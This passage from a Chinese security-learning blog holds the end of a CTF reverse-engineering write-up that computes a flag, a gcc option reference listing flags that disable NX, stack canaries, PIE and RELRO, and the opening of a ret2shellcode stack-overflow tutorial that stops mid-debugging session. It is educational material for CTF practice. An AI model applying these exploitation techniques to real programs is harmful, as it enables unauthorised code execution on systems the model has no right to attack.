1000000);</span><br><span class="line">  sub_401000(v114, v112);</span><br><span class="line">  v115 = _78[0];</span><br><span class="line">  v116 = sub_401000(_84, 1);</span><br><span class="line">  sub_401100(v116, v115);</span><br><span class="line">  sub_401000(_88, _84[0]);</span><br><span class="line">  ((void (__cdecl *)(const char *, signed int))sub_401C7F)("CTF{", 1);</span><br><span class="line">  for ( j = 0; j &lt; 32; ++j )</span><br><span class="line">    sub_401C7F("%c", SLOBYTE(v120[j]));</span><br><span class="line">  sub_401C7F("}\n");</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这里看到三个函数</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sub_401000</span><br><span class="line">sub_401100</span><br><span class="line">sub_401220</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">int *__cdecl sub_401000(int *a1, int a2)</span><br><span class="line">{</span><br><span class="line">  int v2; // edx</span><br><span class="line">  int v4; // [esp+Ch] [ebp-18h]</span><br><span class="line">  signed int v5; // [esp+10h] [ebp-14h]</span><br><span class="line">  int v6; // [esp+18h] [ebp-Ch]</span><br><span class="line">  signed int v7; // [esp+1Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = -1;</span><br><span class="line">  v4 = -1 - a2 + 1;</span><br><span class="line">  v7 = 1231;</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v6 = a2 + 1231;</span><br><span class="line">  while ( v4 )</span><br><span class="line">  {</span><br><span class="line">    ++v7;</span><br><span class="line">    --*a1;</span><br><span class="line">    --v4;</span><br><span class="line">    --v6;</span><br><span class="line">  }</span><br><span class="line">  while ( v5 )</span><br><span class="line">  {</span><br><span class="line">    --v6;</span><br><span class="line">    ++*a1;</span><br><span class="line">    --v5;</span><br><span class="line">  }</span><br><span class="line">  ++*a1;</span><br><span class="line">  return a1;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">int *__cdecl sub_401100(int *a1, int a2)</span><br><span class="line">{</span><br><span class="line">  int v2; // ST20_4</span><br><span class="line">  signed int v4; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int v5; // [esp+14h] [ebp-14h]</span><br><span class="line">  int v6; // [esp+18h] [ebp-10h]</span><br><span class="line">  int v7; // [esp+1Ch] [ebp-Ch]</span><br><span class="line">  int v8; // [esp+20h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = *a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  v4 = -1;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  v7 = a2 * v5;</span><br><span class="line">  while ( a2 )</span><br><span class="line">  {</span><br><span class="line">    v2 = v7 * v5;</span><br><span class="line">    sub_401000(&amp;v8, *a1);</span><br><span class="line">    ++v7;</span><br><span class="line">    --a2;</span><br><span class="line">    v6 = v2 - 1;</span><br><span class="line">  }</span><br><span class="line">  while ( v4 )</span><br><span class="line">  {</span><br><span class="line">    ++v7;</span><br><span class="line">    ++*a1;</span><br><span class="line">    --v4;</span><br><span class="line">    --v6;</span><br><span class="line">  }</span><br><span class="line">  ++*a1;</span><br><span class="line">  *a1 = v8;</span><br><span class="line">  return a1;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">_DWORD *__cdecl sub_401220(_DWORD *a1, int a2)</span><br><span class="line">{</span><br><span class="line">  int v3; // [esp+8h] [ebp-10h]</span><br><span class="line">  signed int v4; // [esp+Ch] [ebp-Ch]</span><br><span class="line">  signed int v5; // [esp+14h] [ebp-4h]</span><br><span class="line">  int v6; // [esp+14h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v4 = -1;</span><br><span class="line">  v3 = -1 - a2 + 1;</span><br><span class="line">  v5 = -1;</span><br><span class="line">  while ( v3 )</span><br><span class="line">  {</span><br><span class="line">    ++*a1;</span><br><span class="line">    --v3;</span><br><span class="line">    --v5;</span><br><span class="line">  }</span><br><span class="line">  v6 = v5 * v5;</span><br><span class="line">  while ( v4 )</span><br><span class="line">  {</span><br><span class="line">    v6 *= 123;</span><br><span class="line">    ++*a1;</span><br><span class="line">    --v4;</span><br><span class="line">  }</span><br><span class="line">  ++*a1;</span><br><span class="line">  return a1;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="简化代码"><a href="#简化代码" class="headerlink" title="简化代码"></a>简化代码</h3><p>在这里我们只考虑程序能否执行，不考虑 ida 反编译后的特殊变量，首先去掉无用变量，怎样的为无用变量，定义后没有使用的，在循环里做运算，但是循环条件和最后的赋值都和它没关系的基本都为无用变量，首先简化函数 sub_41000，这里在 sub_41000 函数中我们可以看到，v2 定义后没有使用，v4、v5 为循环条件，最后返回的 a1 为有效变量，所以其他的为无用变量，将其删除简化代码。sub_401100 函数中第二个 while 循环整个是无用算法，因为最后 a1 赋值为 v8，所以在赋值前所有对 a1 的操作都是无用算法，sub_401220 函数与 sub_401000 类似。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">int* __cdecl sub_401000(int* a1, int a2)</span><br><span class="line">{</span><br><span class="line">    int v4; // [esp+Ch] [ebp-18h]</span><br><span class="line">    signed int v5; // [esp+10h] [ebp-14h]</span><br><span class="line"></span><br><span class="line">    v5 = -1;</span><br><span class="line">    v4 = -a2 ;</span><br><span class="line">    while (v4)</span><br><span class="line">    {</span><br><span class="line">        --* a1;</span><br><span class="line">        --v4;</span><br><span class="line">    }</span><br><span class="line">    while (v5)</span><br><span class="line">    {</span><br><span class="line">        ++* a1;</span><br><span class="line">        --v5;</span><br><span class="line">    }</span><br><span class="line">    ++* a1;</span><br><span class="line">    return a1;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">int* __cdecl sub_401100(int* a1, int a2)</span><br><span class="line">{</span><br><span class="line">	int v8; // [esp+20h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">	v8 = 0;</span><br><span class="line">	while (a2)</span><br><span class="line">	{</span><br><span class="line">		sub_401000(&amp;v8, *a1);</span><br><span class="line">		--a2;</span><br><span class="line">	}</span><br><span class="line">	*a1 = v8;</span><br><span class="line">	return a1;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">_DWORD* __cdecl sub_401220(_DWORD* a1, int a2)</span><br><span class="line">{</span><br><span class="line">	int v3; // [esp+8h] [ebp-10h]</span><br><span class="line">	signed int v4; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">	v4 = -1;</span><br><span class="line">	v3 = -a2;</span><br><span class="line">	while (v3)</span><br><span class="line">	{</span><br><span class="line">		++* a1;</span><br><span class="line">		--v3;</span><br><span class="line">	}</span><br><span class="line">	while (v4)</span><br><span class="line">	{</span><br><span class="line">		++* a1;</span><br><span class="line">		--v4;</span><br><span class="line">	}</span><br><span class="line">	++* a1;</span><br><span class="line">	return a1;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>之后进行程序分析，注意需要从头开始，有些人直接跳过变量定义直接分析算法，这好吗？这不好。<br>这小伙子上来就是一个反码补码，一个内存溢出，一个内存负数转换。</p>
<p><strong>sub_401000</strong><br>这里看到 v4、v5 为整型 int（signed int 简写为 int), 范围 2^-31 ~ 2^31-1, 这里为了方便，我们用数轴上的距离代替次数讲解。<br><img src="./Newbie_calculations_2.png"><br>我们假设 - a2 为数轴中的位置，第一个 while 循环条件 v4 为负数，在循环中减一，由于数字在内存中存储的特性（不懂得先去了解内存中负数存储机制），循环的距离应该为 L1+L2，a1 也减去 L1+L2 距离，而第二个 while 循环则从 - 1 开始，循环距离为 L1+L2+L4，a1 加上 L1+L2+L4 的距离，两个循环结合 a1 加上 L4，这是我们将距离转换为个数，个数比距离多 1，所以实际上 L4 应该是 L4+1，也就是 a2。（这里确实有点难理解，我也不知道我有没有讲清楚）</p>
<p><strong>sub_401100</strong><br>有了 sub_401000 的经验，我们可以理解 while 循环中是加上了 a2 个 a2，也就是 a1*a2.</p>
<p><strong>sub_401220</strong><br>这个函数和 sub_401000 几乎一模一样，而这里的第二个循环并没有像 sub_401000 加，而是依旧减去，我们可以猜到这是 a1-a2</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>将 ida 里的代码转换为能运行的代码，代入这三个函数，运行得到 flag。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;cstdio&gt;</span><br><span class="line"></span><br><span class="line">int sub_401000(int a1, int a2)</span><br><span class="line">{</span><br><span class="line">    return a1 + a2;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">int sub_401100(int a1, int a2)</span><br><span class="line">{</span><br><span class="line">   return a1  *a2;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">int sub_401220(int a1, int a2)</span><br><span class="line">{</span><br><span class="line">    return a1 - a2;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    int v3; // eax</span><br><span class="line">    int v4; // eax</span><br><span class="line">    int v5; // eax</span><br><span class="line">    int v6; // eax</span><br><span class="line">    int v7; // eax</span><br><span class="line">    int v8; // eax</span><br><span class="line">    int v9; // eax</span><br><span class="line">    int v10; // eax</span><br><span class="line">    int v11; // eax</span><br><span class="line">    int v12; // eax</span><br><span class="line">    int v13; // eax</span><br><span class="line">    int v14; // eax</span><br><span class="line">    int v15; // eax</span><br><span class="line">    int v16; // eax</span><br><span class="line">    int v17; // eax</span><br><span class="line">    int v18; // eax</span><br><span class="line">    int v19; // eax</span><br><span class="line">    int v20; // eax</span><br><span class="line">    int v21; // eax</span><br><span class="line">    int v22; // eax</span><br><span class="line">    int v23; // eax</span><br><span class="line">    int v24; // eax</span><br><span class="line">    int v25; // eax</span><br><span class="line">    int v26; // eax</span><br><span class="line">    int v27; // eax</span><br><span class="line">    int v28; // eax</span><br><span class="line">    int v29; // eax</span><br><span class="line">    int v30; // eax</span><br><span class="line">    int v31; // eax</span><br><span class="line">    int v32; // eax</span><br><span class="line">    int v33; // eax</span><br><span class="line">    int v34; // eax</span><br><span class="line">    int v35; // eax</span><br><span class="line">    int v36; // eax</span><br><span class="line">    int v37; // eax</span><br><span class="line">    int v38; // eax</span><br><span class="line">    int v39; // eax</span><br><span class="line">    int v40; // eax</span><br><span class="line">    int v41; // eax</span><br><span class="line">    int v42; // eax</span><br><span class="line">    int v43; // eax</span><br><span class="line">    int v44; // eax</span><br><span class="line">    int v45; // eax</span><br><span class="line">    int v46; // eax</span><br><span class="line">    int v47; // eax</span><br><span class="line">    int v48; // eax</span><br><span class="line">    int v49; // eax</span><br><span class="line">    int v50; // eax</span><br><span class="line">    int v51; // eax</span><br><span class="line">    int v52; // eax</span><br><span class="line">    int v53; // eax</span><br><span class="line">    int v54; // eax</span><br><span class="line">    int v55; // eax</span><br><span class="line">    int v56; // eax</span><br><span class="line">    int v57; // eax</span><br><span class="line">    int v58; // eax</span><br><span class="line">    int v59; // eax</span><br><span class="line">    int v60; // eax</span><br><span class="line">    int v61; // eax</span><br><span class="line">    int v62; // eax</span><br><span class="line">    int v63; // eax</span><br><span class="line">    int v64; // eax</span><br><span class="line">    int v65; // eax</span><br><span class="line">    int v66; // eax</span><br><span class="line">    int v67; // eax</span><br><span class="line">    int v68; // eax</span><br><span class="line">    int v69; // eax</span><br><span class="line">    int v70; // eax</span><br><span class="line">    int v71; // eax</span><br><span class="line">    int v72; // eax</span><br><span class="line">    int v73; // eax</span><br><span class="line">    int v74; // eax</span><br><span class="line">    int v75; // eax</span><br><span class="line">    int v76; // eax</span><br><span class="line">    int v77; // eax</span><br><span class="line">    int v78; // eax</span><br><span class="line">    int v79; // eax</span><br><span class="line">    int v80; // eax</span><br><span class="line">    int v81; // eax</span><br><span class="line">    int v82; // eax</span><br><span class="line">    int v83; // eax</span><br><span class="line">    int v84; // eax</span><br><span class="line">    int v85; // eax</span><br><span class="line">    int v86; // eax</span><br><span class="line">    int v87; // eax</span><br><span class="line">    int v88; // eax</span><br><span class="line">    int v89; // eax</span><br><span class="line">    int v90; // eax</span><br><span class="line">    int v91; // eax</span><br><span class="line">    int v92; // eax</span><br><span class="line">    int v93; // eax</span><br><span class="line">    int v94; // eax</span><br><span class="line">    int v95; // eax</span><br><span class="line">    int v96; // eax</span><br><span class="line">    int v97; // eax</span><br><span class="line">    int v98; // eax</span><br><span class="line">    int v99; // eax</span><br><span class="line">    int v100; // eax</span><br><span class="line">    int v101; // eax</span><br><span class="line">    int v102; // eax</span><br><span class="line">    int v103; // eax</span><br><span class="line">    int v104; // eax</span><br><span class="line">    int v105; // eax</span><br><span class="line">    int v106; // eax</span><br><span class="line">    int v107; // eax</span><br><span class="line">    int v108; // eax</span><br><span class="line">    int v109; // ST1C_4</span><br><span class="line">    int v110; // eax</span><br><span class="line">    int v111; // eax</span><br><span class="line">    int v112; // ST20_4</span><br><span class="line">    int v113; // eax</span><br><span class="line">    int v114; // eax</span><br><span class="line">    int v115; // ST20_4</span><br><span class="line">    int v116; // eax</span><br><span class="line">    signed int i; // [esp+4h] [ebp-90h]</span><br><span class="line">    signed int j; // [esp+8h] [ebp-8Ch]</span><br><span class="line">    int v120[32]; // [esp+Ch] [ebp-88h]</span><br><span class="line">    int v121; // [esp+8Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; 32; ++i)</span><br><span class="line">        v120[i] = 1;</span><br><span class="line">    v121 = 0;</span><br><span class="line">    puts("Your flag is:");</span><br><span class="line">    v3 = sub_401100(v120[0], 1000000000);</span><br><span class="line">    v4 = sub_401220(v3, 999999950);</span><br><span class="line">    v120[0] = sub_401100(v4, 2);</span><br><span class="line">    v5 = sub_401000(v120[1], 5000000);</span><br><span class="line">    v6 = sub_401220(v5, 6666666);</span><br><span class="line">    v7 = sub_401000(v6, 1666666);</span><br><span class="line">    v8 = sub_401000(v7, 45);</span><br><span class="line">    v9 = sub_401100(v8, 2);</span><br><span class="line">    v120[1] = sub_401000(v9, 5);</span><br><span class="line">    v10 = sub_401100(v120[2], 1000000000);</span><br><span class="line">    v11 = sub_401220(v10, 999999950);</span><br><span class="line">    v12 = sub_401100(v11, 2);</span><br><span class="line">    v120[2] = sub_401000(v12, 2);</span><br><span class="line">    v13 = sub_401000(v120[3], 55);</span><br><span class="line">    v14 = sub_401220(v13, 3);</span><br><span class="line">    v15 = sub_401000(v14, 4);</span><br><span class="line">    v120[3] = sub_401220(v15, 1);</span><br><span class="line">    v16 = sub_401100(v120[4], 100000000);</span><br><span class="line">    v17 = sub_401220(v16, 99999950);</span><br><span class="line">    v18 = sub_401100(v17, 2);</span><br><span class="line">    v120[4] = sub_401000(v18, 2);</span><br><span class="line">    v19 = sub_401220(v120[5], 1);</span><br><span class="line">    v20 = sub_401100(v19, 1000000000);</span><br><span class="line">    v21 = sub_401000(v20, 55);</span><br><span class="line">    v120[5] = sub_401220(v21, 3);</span><br><span class="line">    v22 = sub_401100(v120[6], 1000000);</span><br><span class="line">    v23 = sub_401220(v22, 999975);</span><br><span class="line">    v120[6] = sub_401100(v23, 4);</span><br><span class="line">    v24 = sub_401000(v120[7], 55);</span><br><span class="line">    v25 = sub_401220(v24, 33);</span><br><span class="line">    v26 = sub_401000(v25, 44);</span><br><span class="line">    v120[7] = sub_401220(v26, 11);</span><br><span class="line">    v27 = sub_401100(v120[8], 10);</span><br><span class="line">    v28 = sub_401220(v27, 5);</span><br><span class="line">    v29 = sub_401100(v28, 8);</span><br><span class="line">    v120[8] = sub_401000(v29, 9);</span><br><span class="line">    v30 = sub_401000(v120[9], 0);</span><br><span class="line">    v31 = sub_401220(v30, 0);</span><br><span class="line">    v32 = sub_401000(v31, 11);</span><br><span class="line">    v33 = sub_401220(v32, 11);</span><br><span class="line">    v120[9] = sub_401000(v33, 53);</span><br><span class="line">    v34 = sub_401000(v120[10], 49);</span><br><span class="line">    v35 = sub_401220(v34, 2);</span><br><span class="line">    v36 = sub_401000(v35, 4);</span><br><span class="line">    v120[10] = sub_401220(v36, 2);</span><br><span class="line">    v37 = sub_401100(v120[11], 1000000);</span><br><span class="line">    v38 = sub_401220(v37, 999999);</span><br><span class="line">    v39 = sub_401100(v38, 4);</span><br><span class="line">    v120[11] = sub_401000(v39, 50);</span><br><span class="line">    v40 = sub_401000(v120[12], 1);</span><br><span class="line">    v41 = sub_401000(v40, 1);</span><br><span class="line">    v42 = sub_401000(v41, 1);</span><br><span class="line">    v43 = sub_401000(v42, 1);</span><br><span class="line">    v44 = sub_401000(v43, 1);</span><br><span class="line">    v45 = sub_401000(v44, 1);</span><br><span class="line">    v46 = sub_401000(v45, 10);</span><br><span class="line">    v120[12] = sub_401000(v46, 32);</span><br><span class="line">    v47 = sub_401100(v120[13], 10);</span><br><span class="line">    v48 = sub_401220(v47, 5);</span><br><span class="line">    v49 = sub_401100(v48, 8);</span><br><span class="line">    v50 = sub_401000(v49, 9);</span><br><span class="line">    v120[13] = sub_401000(v50, 48);</span><br><span class="line">    v51 = sub_401220(v120[14], 1);</span><br><span class="line">    v52 = sub_401100(v51, -294967296);</span><br><span class="line">    v53 = sub_401000(v52, 55);</span><br><span class="line">    v120[14] = sub_401220(v53, 3);</span><br><span class="line">    v54 = sub_401000(v120[15], 1);</span><br><span class="line">    v55 = sub_401000(v54, 2);</span><br><span class="line">    v56 = sub_401000(v55, 3);</span><br><span class="line">    v57 = sub_401000(v56, 4);</span><br><span class="line">    v58 = sub_401000(v57, 5);</span><br><span class="line">    v59 = sub_401000(v58, 6);</span><br><span class="line">    v60 = sub_401000(v59, 7);</span><br><span class="line">    v120[15] = sub_401000(v60, 20);</span><br><span class="line">    v61 = sub_401100(v120[16], 10);</span><br><span class="line">    v62 = sub_401220(v61, 5);</span><br><span class="line">    v63 = sub_401100(v62, 8);</span><br><span class="line">    v64 = sub_401000(v63, 9);</span><br><span class="line">    v120[16] = sub_401000(v64, 48);</span><br><span class="line">    v65 = sub_401000(v120[17], 7);</span><br><span class="line">    v66 = sub_401000(v65, 6);</span><br><span class="line">    v67 = sub_401000(v66, 5);</span><br><span class="line">    v68 = sub_401000(v67, 4);</span><br><span class="line">    v69 = sub_401000(v68, 3);</span><br><span class="line">    v70 = sub_401000(v69, 2);</span><br><span class="line">    v71 = sub_401000(v70, 1);</span><br><span class="line">    v120[17] = sub_401000(v71, 20);</span><br><span class="line">    v72 = sub_401000(v120[18], 7);</span><br><span class="line">    v73 = sub_401000(v72, 2);</span><br><span class="line">    v74 = sub_401000(v73, 4);</span><br><span class="line">    v75 = sub_401000(v74, 3);</span><br><span class="line">    v76 = sub_401000(v75, 6);</span><br><span class="line">    v77 = sub_401000(v76, 5);</span><br><span class="line">    v78 = sub_401000(v77, 1);</span><br><span class="line">    v120[18] = sub_401000(v78, 20);</span><br><span class="line">    v79 = sub_401100(v120[19], 1000000);</span><br><span class="line">    v80 = sub_401220(v79, 999999);</span><br><span class="line">    v81 = sub_401100(v80, 4);</span><br><span class="line">    v82 = sub_401000(v81, 50);</span><br><span class="line">    v120[19] = sub_401220(v82, 1);</span><br><span class="line">    v83 = sub_401220(v120[20], 1);</span><br><span class="line">    v84 = sub_401100(v83, -294967296);</span><br><span class="line">    v85 = sub_401000(v84, 49);</span><br><span class="line">    v120[20] = sub_401220(v85, 1);</span><br><span class="line">    v86 = sub_401220(v120[21], 1);</span><br><span class="line">    v87 = sub_401100(v86, 1000000000);</span><br><span class="line">    v88 = sub_401000(v87, 54);</span><br><span class="line">    v89 = sub_401220(v88, 1);</span><br><span class="line">    v90 = sub_401000(v89, 1000000000);</span><br><span class="line">    v120[21] = sub_401220(v90, 1000000000);</span><br><span class="line">    v91 = sub_401000(v120[22], 49);</span><br><span class="line">    v92 = sub_401220(v91, 1);</span><br><span class="line">    v93 = sub_401000(v92, 2);</span><br><span class="line">    v120[22] = sub_401220(v93, 1);</span><br><span class="line">    v94 = sub_401100(v120[23], 10);</span><br><span class="line">    v95 = sub_401220(v94, 5);</span><br><span class="line">    v96 = sub_401100(v95, 8);</span><br><span class="line">    v97 = sub_401000(v96, 9);</span><br><span class="line">    v120[23] = sub_401000(v97, 48);</span><br><span class="line">    v98 = sub_401000(v120[24], 1);</span><br><span class="line">    v99 = sub_401000(v98, 3);</span><br><span class="line">    v100 = sub_401000(v99, 3);</span><br><span class="line">    v101 = sub_401000(v100, 3);</span><br><span class="line">    v102 = sub_401000(v101, 6);</span><br><span class="line">    v103 = sub_401000(v102, 6);</span><br><span class="line">    v104 = sub_401000(v103, 6);</span><br><span class="line">    v120[24] = sub_401000(v104, 20);</span><br><span class="line">    v105 = sub_401000(v120[25], 55);</span><br><span class="line">    v106 = sub_401220(v105, 33);</span><br><span class="line">    v107 = sub_401000(v106, 44);</span><br><span class="line">    v108 = sub_401220(v107, 11);</span><br><span class="line">    v120[25] = sub_401000(v108, 42);</span><br><span class="line">    v120[26] = sub_401000(v120[26], v120[25]);</span><br><span class="line">    v120[27] = sub_401000(v120[27], v120[12]);</span><br><span class="line">    v109 = v120[27];</span><br><span class="line">    v110 = sub_401220(v120[28], 1);</span><br><span class="line">    v111 = sub_401000(v110, v109);</span><br><span class="line">    v120[28] = sub_401220(v111, 1);</span><br><span class="line">    v112 = v120[23];</span><br><span class="line">    v113 = sub_401220(v120[29], 1);</span><br><span class="line">    v114 = sub_401100(v113, 1000000);</span><br><span class="line">    v120[29] = sub_401000(v114, v112);</span><br><span class="line">    v115 = v120[27];</span><br><span class="line">    v116 = sub_401000(v120[30], 1);</span><br><span class="line">    v120[30] = sub_401100(v116, v115);</span><br><span class="line">    v120[31] = sub_401000(v120[31], v120[30]);</span><br><span class="line">    printf("CTF{");</span><br><span class="line">    for (j = 0; j &lt; 32; ++j)</span><br><span class="line">        printf("%c", v120[j]);</span><br><span class="line">    printf("}\n");</span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>WriteUp-攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>gcc 命令</title>
    <url>/2020/12/03/gcc%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="gcc命令"><a href="#gcc命令" class="headerlink" title="gcc命令"></a>gcc 命令</h1><p>gcc 命令使用 GNU 推出的基于 C/C++ 的编译器，是开放源代码领域应用最广泛的编译器，具有功能强大，编译代码支持性能优化等特点。现在很多程序员都应用 GCC，怎样才能更好的应用 GCC。目前，GCC 可以用来编译 C/C++、FORTRAN、JAVA、OBJC、ADA 等语言的程序，可根据需要选择安装支持的语言。</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p><code>gcc (选项)(参数)</code></p>
<h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">-o：指定生成的输出文件；</span><br><span class="line">-E：仅执行编译预处理；</span><br><span class="line">-S：将C代码转换为汇编代码；</span><br><span class="line">-wall：显示警告信息；</span><br><span class="line">-c：仅执行编译操作，不进行连接操作。</span><br><span class="line">-m32：生成32位机器上的代码。</span><br><span class="line">-m64：生成64位机器上的代码。</span><br><span class="line"></span><br><span class="line">各种安全选择的编译参数如下：</span><br><span class="line">NX：-z execstack / -z noexecstack (关闭 / 开启)</span><br><span class="line">Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</span><br><span class="line">PIE：-no-pie / -pie (关闭 / 开启)</span><br><span class="line">RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</span><br></pre></td></tr></tbody></table></figure>
<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>C 源文件：指定 C 语言源代码文件。</p>
]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2shellcode</title>
    <url>/2020/12/04/ret2shellcode/</url>
    <content><![CDATA[<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</strong></p>
<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
<a id="more"></a>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p>
<p>首先检测程序开启的保护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  strncpy(buf2, &amp;s, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure>

<p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ b main </span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: &#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode </span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xf7fb4dd8 --&gt; 0xffffd09c --&gt; 0xffffd29b (&quot;CLUTTER_IM_MODULE&#x3D;xim&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xfaa899a4 </span><br><span class="line">EDX: 0xffffd024 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb3000 --&gt; 0x1d7d8c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xffffcff8 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffcf70 --&gt; 0x0 </span><br><span class="line">EIP: 0x8048536 (&lt;main+9&gt;:	mov    eax,ds:0x804a060)</span><br><span class="line">EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x804852e &lt;main+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x8048530 &lt;main+3&gt;:	and    esp,0xfffffff0</span><br><span class="line">   0x8048533 &lt;main+6&gt;:	add    esp,0xffffff80</span><br><span class="line">&#x3D;&gt; 0x8048536 &lt;main+9&gt;:	mov    eax,ds:0x804a060</span><br><span class="line">   0x804853b &lt;main+14&gt;:	mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">   0x8048543 &lt;main+22&gt;:	mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">   0x804854b &lt;main+30&gt;:	mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">   0x8048553 &lt;main+38&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffcf70 --&gt; 0x0 </span><br><span class="line">0004| 0xffffcf74 --&gt; 0x1 </span><br><span class="line">0008| 0xffffcf78 --&gt; 0xf7ffd940 --&gt; 0x0 </span><br><span class="line">0012| 0xffffcf7c --&gt; 0xc2 </span><br><span class="line">0016| 0xffffcf80 --&gt; 0x0 </span><br><span class="line">0020| 0xffffcf84 --&gt; 0xc30000 </span><br><span class="line">0024| 0xffffcf88 --&gt; 0x0 </span><br><span class="line">0028| 0xffffcf8c --&gt; 0xf7ffd000 --&gt; 0x26f34 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">8	ret2shellcode.c: 没有那个文件或目录.</span><br><span class="line">gdb-peda$ vmmap </span><br><span class="line">Start      End        Perm	Name</span><br><span 